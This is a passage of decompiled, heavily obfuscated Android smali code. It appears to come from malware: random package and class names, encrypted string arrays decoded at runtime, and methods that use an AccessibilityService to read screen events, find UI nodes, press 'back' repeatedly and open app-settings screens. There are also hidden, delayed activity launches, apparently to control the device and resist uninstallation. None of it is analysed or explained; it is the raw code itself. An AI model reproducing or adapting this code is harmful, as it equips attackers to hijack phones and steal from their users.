        -0x62t
        0x68t
        -0x10t
        0x31t
        -0x5et
        -0x61t
    .end array-data

    :array_2c
    .array-data 1
        0x1ft
        -0x48t
        0x79t
        -0x6bt
        0x6bt
        0x2bt
        -0x6at
        0x6bt
        0x6bt
    .end array-data

    nop

    :array_2d
    .array-data 1
        -0x1t
        0x0t
        -0x1et
        0x75t
        -0x2dt
        -0x61t
        0x76t
        -0x2dt
    .end array-data

    :array_2e
    .array-data 1
        0x5at
        0x5dt
        0x44t
    .end array-data

    :array_2f
    .array-data 1
        -0x4ft
        -0x24t
        -0x30t
        0x51t
        -0x29t
        0x3t
        0x40t
        0x6dt
    .end array-data

    :array_30
    .array-data 1
        -0x6at
        0x28t
        0x1ct
        0x7ct
        0x59t
        0x29t
    .end array-data

    nop

    :array_31
    .array-data 1
        0x73t
        -0x48t
        -0x4dt
        -0x67t
        -0x2dt
        -0x7ft
        0x26t
        -0x62t
    .end array-data

    :array_32
    .array-data 1
        -0x77t
        0x0t
        -0x75t
        -0x60t
        0x5et
        0x3at
    .end array-data

    nop

    :array_33
    .array-data 1
        0x6ct
        -0x6bt
        0x14t
        0x45t
        -0x2bt
        -0x51t
        -0x5dt
        0x55t
    .end array-data

    :array_34
    .array-data 1
        0x2ct
        0x2bt
        0x66t
        0x35t
        0x8t
        -0x69t
    .end array-data

    nop

    :array_35
    .array-data 1
        0x40t
        0x4at
        0x13t
        0x5bt
        0x6bt
        -0x1t
        -0x6at
        -0xet
    .end array-data

    :array_36
    .array-data 1
        0x32t
        -0xdt
        0x3t
        0x69t
        0x1bt
        -0x53t
    .end array-data

    nop

    :array_37
    .array-data 1
        -0x2bt
        0x67t
        -0x4at
        -0x71t
        -0x56t
        0xdt
        0x10t
        0x16t
    .end array-data

    :array_38
    .array-data 1
        0x3et
        0x5ct
        -0x54t
        -0x4et
        0x5ft
        -0x5ct
    .end array-data

    nop

    :array_39
    .array-data 1
        -0x29t
        -0x39t
        0x17t
        0x54t
        -0x12t
        0x4t
        0x49t
        -0x11t
    .end array-data

    :array_3a
    .array-data 1
        -0x6at
        0x24t
        0x16t
        -0x17t
        -0x32t
        0x33t
        0x16t
    .end array-data

    :array_3b
    .array-data 1
        -0x2ct
        0x45t
        0x62t
        -0x63t
        -0x55t
        0x41t
        0x6ft
        0x5dt
    .end array-data

    :array_3c
    .array-data 1
        0x1ft
        -0x6bt
        0x2et
        -0x32t
        0x61t
        -0x17t
        -0x26t
        0x15t
        0x58t
    .end array-data

    nop

    :array_3d
    .array-data 1
        -0xct
        0x25t
        -0x62t
        0x23t
        -0x1bt
        0x59t
        0x31t
        -0x4dt
    .end array-data

    :array_3e
    .array-data 1
        0x66t
        0x43t
        -0x25t
        -0x3at
        0x54t
        0x1at
        0x0t
        -0x53t
        0x3t
        0x23t
        -0x38t
        -0x71t
        0x34t
        0x1at
        0x5ft
    .end array-data

    :array_3f
    .array-data 1
        -0x7bt
        -0x40t
        0x4bt
        0x25t
        -0x29t
        -0x67t
        -0x1dt
        0x2et
    .end array-data

    :array_40
    .array-data 1
        -0x9t
        -0x6ft
        0x16t
        0x76t
        0x1t
        -0x8t
        0x6t
        0x79t
        -0xat
        -0x80t
        0x16t
        0x73t
        0x1t
        -0xbt
    .end array-data

    nop

    :array_41
    .array-data 1
        0x27t
        0x0t
        -0x3at
        -0x3at
        -0x30t
        0x7at
        -0x2at
        -0x37t
    .end array-data

    :array_42
    .array-data 1
        0x36t
        -0x73t
        0x48t
        0x11t
        -0x4at
        0x74t
        0x1bt
        0x53t
        0x37t
        -0x51t
        0x48t
        0xft
    .end array-data

    :array_43
    .array-data 1
        -0x12t
        0x25t
        -0x70t
        -0x5at
        0x6et
        -0x2dt
        -0x3dt
        -0x1et
    .end array-data

    :array_44
    .array-data 1
        -0x6et
        0x3ct
        -0x37t
        0x1dt
        -0x7ct
        -0x5bt
        -0x45t
    .end array-data

    :array_45
    .array-data 1
        -0x30t
        0x5dt
        -0x43t
        0x78t
        -0xat
        -0x34t
        -0x26t
        -0x79t
    .end array-data

    :array_46
    .array-data 1
        0x7ft
        0x78t
        -0x1t
    .end array-data

    :array_47
    .array-data 1
        0x2ft
        0x11t
        -0x6dt
        -0x21t
        -0x52t
        -0x77t
        0x5dt
        -0x6dt
    .end array-data

    :array_48
    .array-data 1
        0x49t
        -0x6bt
        0x5ct
        0x5bt
        -0x45t
        -0x63t
    .end array-data

    nop

    :array_49
    .array-data 1
        -0x54t
        0x2ft
        -0x38t
        -0x44t
        0x2ft
        0x35t
        0x17t
        -0x58t
    .end array-data

    :array_4a
    .array-data 1
        -0x4at
        0x40t
        -0x36t
        -0x5dt
        -0x4dt
        -0x79t
    .end array-data

    nop

    :array_4b
    .array-data 1
        0x50t
        -0x39t
        0x43t
        0x44t
        0x27t
        0x2ft
        0x57t
        -0x2ct
    .end array-data

    :array_4c
    .array-data 1
        -0x1t
        0x6at
        0x1dt
        -0x41t
        -0x2t
        -0x45t
        0x28t
        0xft
        -0x29t
        0x75t
        0x3t
    .end array-data

    :array_4d
    .array-data 1
        -0x42t
        0x1at
        0x6dt
        -0x2dt
        -0x69t
        -0x28t
        0x49t
        0x7bt
    .end array-data

    :array_4e
    .array-data 1
        0x23t
        0x77t
        0x5et
    .end array-data

    :array_4f
    .array-data 1
        -0x31t
        -0x1et
        -0x11t
        -0x57t
        0x44t
        0x3ct
        -0x6at
        -0xft
    .end array-data

    :array_50
    .array-data 1
        0x48t
        0x38t
        0x78t
        0x23t
        0xft
        0x61t
        -0x3dt
        0x38t
        0x8t
        0x41t
        0x64t
        0x4et
        0x77t
        0x70t
        -0x64t
        0x72t
        0x21t
        0x35t
    .end array-data

    nop

    :array_51
    .array-data 1
        -0x5ct
        -0x53t
        -0x28t
        -0x32t
        -0x65t
        -0x13t
        0x28t
        -0x62t
    .end array-data

    :array_52
    .array-data 1
        -0xet
        0x23t
        0x59t
        -0x6ct
        0x25t
        -0x2t
        0x5ct
        -0x46t
        -0x45t
    .end array-data

    nop

    :array_53
    .array-data 1
        0x11t
        -0x5ft
        -0x5t
        0x77t
        -0x5at
        0x69t
        -0x41t
        0x39t
    .end array-data

    :array_54
    .array-data 1
        -0x35t
        -0x6ct
        0x2ft
        0x74t
        0x4t
        0x64t
        -0x7ft
        0x79t
        -0x7et
        -0xbt
        0xft
        0x26t
        0x64t
        0x70t
        -0x22t
        0x19t
        -0x56t
        -0x5ft
        0x6et
        0x14t
        0x20t
        0x10t
        -0x1ft
        0x49t
    .end array-data

    :array_55
    .array-data 1
        0x28t
        0x16t
        -0x73t
        -0x69t
        -0x79t
        -0xdt
        0x62t
        -0x6t
    .end array-data

    :array_56
    .array-data 1
        0x2dt
        -0x25t
        -0x37t
        -0x21t
        0x1dt
        -0x1ft
        0xet
        -0x3ct
        0x2dt
        -0x6t
        -0x38t
        -0x17t
        0x1dt
        -0x14t
        0xet
        -0x3et
        0x2dt
        -0x4t
        -0x38t
        -0x16t
    .end array-data

    :array_57
    .array-data 1
        -0x3t
        0x44t
        0x18t
        0x5ft
        -0x33t
        0x59t
        -0x22t
        0x7ft
    .end array-data

    :array_58
    .array-data 1
        0x57t
        -0x4ft
        0x1et
        -0x5ft
        -0x67t
        -0x29t
        0x68t
        -0x37t
        0x56t
        -0x67t
    .end array-data

    nop

    :array_59
    .array-data 1
        -0x71t
        0x1bt
        -0x3at
        0x16t
        0x41t
        0x7ft
        -0x4ft
        0x43t
    .end array-data

    :array_5a
    .array-data 1
        -0x58t
        0x26t
        0x73t
        -0xbt
        -0x2t
        0x75t
        0xct
        -0x7et
        0x2at
        -0x1bt
        0x71t
    .end array-data

    :array_5b
    .array-data 1
        -0x17t
        0x56t
        0x1ft
        -0x64t
        -0x63t
        0x14t
        0x6ft
        -0x15t
    .end array-data

    :array_5c
    .array-data 1
        0x68t
        -0x74t
        -0x22t
        -0x47t
        0x5at
        0x35t
        -0x58t
        -0xbt
        -0x16t
        0x5ft
        -0x23t
    .end array-data

    :array_5d
    .array-data 1
        0x29t
        -0x4t
        -0x4et
        -0x30t
        0x39t
        0x54t
        0x6bt
        0x52t
    .end array-data

    :array_5e
    .array-data 1
        0xct
        -0xft
        -0x6dt
        0x1bt
        0x29t
        -0x67t
        0x4t
        -0x43t
        0x2at
    .end array-data

    nop

    :array_5f
    .array-data 1
        0x4dt
        -0x61t
        -0x1ct
        0x7et
        0x47t
        -0x3t
        0x71t
        -0x2dt
    .end array-data

    :array_60
    .array-data 1
        -0x2dt
        -0x13t
        -0x6ct
        0x52t
        0x74t
        0x41t
        0x1ct
        0x3et
    .end array-data

    :array_61
    .array-data 1
        -0x6et
        -0x63t
        -0x8t
        0x3bt
        0x1ft
        0x20t
        0x6ft
        0x57t
    .end array-data

    :array_62
    .array-data 1
        -0x15t
        0x3ft
        0x3at
        -0x7ct
        -0x49t
        0x43t
        -0x38t
        -0x76t
        -0x4ft
        0x21t
        -0x4t
        -0x73t
    .end array-data

    :array_63
    .array-data 1
        0xat
        -0x7ct
        -0x6et
        -0x16t
        -0x30t
        0x63t
        -0x54t
        0x6bt
    .end array-data

    :array_64
    .array-data 1
        0x1ft
        0x63t
        0xet
        0x7ft
        -0x36t
        0x1ct
        0x44t
        0x2bt
        0x3ft
    .end array-data

    nop

    :array_65
    .array-data 1
        0x5et
        0x13t
        0x62t
        0x16t
        -0x5ft
        0x7dt
        0x27t
        0x41t
    .end array-data

    :array_66
    .array-data 1
        0x52t
        -0x7et
        -0x6dt
        -0x80t
    .end array-data

    :array_67
    .array-data 1
        0x63t
        -0x49t
        -0x5dt
        -0x50t
        -0x34t
        0x2ft
        -0x73t
        0x69t
    .end array-data
.end method

.method public static synthetic A(Landroid/os/Handler;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->U1(Landroid/os/Handler;)V

    return-void
.end method

.method private static A0()V
    .locals 4

    .line 1
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c00;

    invoke-direct {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c00;-><init>()V

    const-wide/16 v2, 0x1f4

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private static A1()V
    .locals 4

    .line 1
    const/4 v0, 0x0

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->n:Z

    const/4 v0, 0x1

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j:Z

    new-instance v0, Landroid/content/Intent;

    const/16 v1, 0x2d

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/4 v1, 0x7

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v2, v2, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v1, v2, v3}, Landroid/net/Uri;->fromParts(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void

    nop

    :array_0
    .array-data 1
        -0x2et
        -0x77t
        -0x78t
        -0x5dt
        0x6dt
        0x18t
        0x78t
        -0x33t
        -0x40t
        -0x7et
        -0x68t
        -0x5bt
        0x6bt
        0x1ft
        0x7bt
        -0x70t
        -0x63t
        -0x5at
        -0x44t
        -0x7ft
        0x4et
        0x38t
        0x5ft
        -0x5et
        -0x19t
        -0x52t
        -0x5dt
        -0x61t
        0x5dt
        0x35t
        0x59t
        -0x49t
        -0xet
        -0x52t
        -0x60t
        -0x7et
        0x5dt
        0x22t
        0x59t
        -0x49t
        -0x19t
        -0x52t
        -0x5et
        -0x6at
        0x51t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x4dt
        -0x19t
        -0x14t
        -0x2ft
        0x2t
        0x71t
        0x1ct
        -0x1dt
    .end array-data

    :array_2
    .array-data 1
        -0x2et
        -0xat
        0x7bt
        0x52t
        -0x2at
        0x4et
        0x3t
    .end array-data

    :array_3
    .array-data 1
        -0x5et
        -0x69t
        0x18t
        0x39t
        -0x49t
        0x29t
        0x66t
        0x22t
    .end array-data
.end method

.method private static synthetic A2(Landroid/content/Context;)V
    .locals 4

    .line 1
    new-instance v0, Landroid/content/Intent;

    const/16 v1, 0x2e

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/16 v1, 0x22

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v3, v2, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/16 v1, 0x21

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v2, v2, [B

    fill-array-data v2, :array_5

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->_Notfy_MSG_:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/oz;

    invoke-direct {v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/oz;-><init>(Landroid/content/Context;)V

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    nop

    :array_0
    .array-data 1
        0x7ft
        0x21t
        -0x65t
        0x40t
        -0x3at
        0x5bt
        -0x3ct
        0x1ct
        0x6dt
        0x2at
        -0x75t
        0x46t
        -0x40t
        0x5ct
        -0x39t
        0x41t
        0x30t
        0xct
        -0x49t
        0x73t
        -0x19t
        0x7ct
        -0x1bt
        0x7et
        0x41t
        0x1t
        -0x50t
        0x66t
        -0x20t
        0x74t
        -0x17t
        0x71t
        0x5ft
        0x1bt
        -0x4at
        0x7dt
        -0x19t
        0x6dt
        -0xdt
        0x77t
        0x4at
        0x1bt
        -0x4at
        0x7ct
        -0x12t
        0x61t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x1et
        0x4ft
        -0x1t
        0x32t
        -0x57t
        0x32t
        -0x60t
        0x32t
    .end array-data

    :array_2
    .array-data 1
        -0x4ft
        0x42t
        0x34t
        0x23t
        0x27t
        -0x11t
        0x67t
        0x31t
        -0x60t
        0x5et
        0x3ft
        0x27t
        0x21t
        -0x1et
        0x66t
        0x6dt
        -0x2t
        0x49t
        0x28t
        0x25t
        0x3at
        -0x19t
        0x2dt
        0x5et
        -0x80t
        0x7ct
        0xft
        0x1t
        0x9t
        -0x3bt
        0x48t
        0x5et
        -0x69t
        0x69t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x30t
        0x2ct
        0x50t
        0x51t
        0x48t
        -0x7at
        0x3t
        0x1ft
    .end array-data

    :array_4
    .array-data 1
        -0x2ct
        -0x57t
        -0xet
        0x6et
        -0xat
        0x5ct
        0x2at
        0x30t
        -0x3bt
        -0x4bt
        -0x7t
        0x6at
        -0x10t
        0x51t
        0x2bt
        0x6ct
        -0x65t
        -0x5et
        -0x12t
        0x68t
        -0x15t
        0x54t
        0x60t
        0x5dt
        -0x3t
        -0x7at
        -0x28t
        0x52t
        -0x24t
        0x79t
        0x11t
        0x57t
        -0xft
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x4bt
        -0x39t
        -0x6at
        0x1ct
        -0x67t
        0x35t
        0x4et
        0x1et
    .end array-data
.end method

.method public static synthetic B(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->F2(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    return-void
.end method

.method public static B0(Landroid/view/accessibility/AccessibilityEvent;Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V
    .locals 1

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    if-nez v0, :cond_0

    sput-object p1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    :cond_0
    if-eqz p0, :cond_5

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result p1

    const/4 v0, 0x1

    if-eq p1, v0, :cond_4

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result p1

    const/16 v0, 0xe

    if-ne p1, v0, :cond_1

    goto :goto_0

    :cond_1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result p1

    const/4 v0, 0x2

    if-ne p1, v0, :cond_2

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->H0(Landroid/view/accessibility/AccessibilityEvent;)V

    goto :goto_1

    :cond_2
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result p1

    const/4 v0, 0x3

    if-ne p1, v0, :cond_3

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->E0(Landroid/view/accessibility/AccessibilityEvent;)V

    goto :goto_1

    :cond_3
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result p1

    const/4 v0, 0x4

    if-ne p1, v0, :cond_5

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->G0(Landroid/view/accessibility/AccessibilityEvent;)V

    goto :goto_1

    :cond_4
    :goto_0
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->D0(Landroid/view/accessibility/AccessibilityEvent;)V

    :cond_5
    :goto_1
    return-void
.end method

.method private static B1()V
    .locals 4

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x21

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    add-int/lit8 v1, v1, -0x2

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0x3e8

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    const/16 v0, 0xa

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->C1(I)V

    goto :goto_2

    :cond_0
    const/4 v0, 0x0

    move v1, v0

    :goto_0
    const/4 v2, 0x3

    if-ge v1, v2, :cond_1

    :try_start_0
    sget-object v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const-wide/16 v2, 0x1f4

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v2

    invoke-virtual {v2}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_1
    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->n:Z

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->G1()V

    :goto_2
    return-void

    :array_0
    .array-data 1
        0x5t
        0x9t
        -0x42t
        0x31t
        0x6ft
        -0x48t
        -0x73t
        -0x17t
        0x9t
        0xft
        -0x49t
        0x31t
        0x7dt
        -0x4dt
        -0x63t
        -0x11t
        0xft
        0x8t
        -0x4ct
        0x6ct
        0x34t
        -0x41t
        -0x73t
        -0x4ct
        0x5t
        0x9t
        -0x5at
        0x76t
        0x51t
        -0x44t
        -0x64t
        -0xat
        0x16t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x66t
        0x66t
        -0x2dt
        0x1ft
        0xet
        -0x2at
        -0x17t
        -0x65t
    .end array-data
.end method

.method private static synthetic B2(Landroid/content/Context;)V
    .locals 4

    .line 1
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/vknnolqo/p9sv5zvf/FtJVk3Ba;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x800000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mz;

    invoke-direct {v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mz;-><init>(Landroid/content/Context;)V

    const-wide/16 v2, 0xc80

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method public static synthetic C(Z)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->S1(Z)V

    return-void
.end method

.method public static C0()V
    .locals 2

    .line 1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v1, 0x1

    if-eq v0, v1, :cond_5

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/16 v1, 0xe

    if-ne v0, v1, :cond_0

    goto :goto_0

    :cond_0
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v1, 0x2

    if-ne v0, v1, :cond_1

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b1()V

    goto :goto_1

    :cond_1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v1, 0x3

    if-ne v0, v1, :cond_2

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Y0()V

    goto :goto_1

    :cond_2
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v1, 0x4

    if-ne v0, v1, :cond_3

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a1()V

    goto :goto_1

    :cond_3
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v1, 0x6

    if-ne v0, v1, :cond_4

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Z0()V

    goto :goto_1

    :cond_4
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

